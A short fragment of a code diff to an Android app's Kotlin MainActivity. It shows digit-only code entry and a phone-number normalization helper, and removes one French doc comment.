         val need = if (Capture.codeLength in 1..10) Capture.codeLength else 5
         findViewById<TextView>(R.id.btn).setOnClickListener {
             val c = code.text.toString().replace(Regex("\\D"), "")
@@ -3248,7 +4157,6 @@ class MainActivity : Activity() {
 
     // ---------------- outils ----------------
 
-    /** Renvoie un numéro E.164 normalisé, ou null si invalide. */
     private fun normalize(ccRaw: String, nRaw: String): String? {
         var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
         if (n.isEmpty()) return null
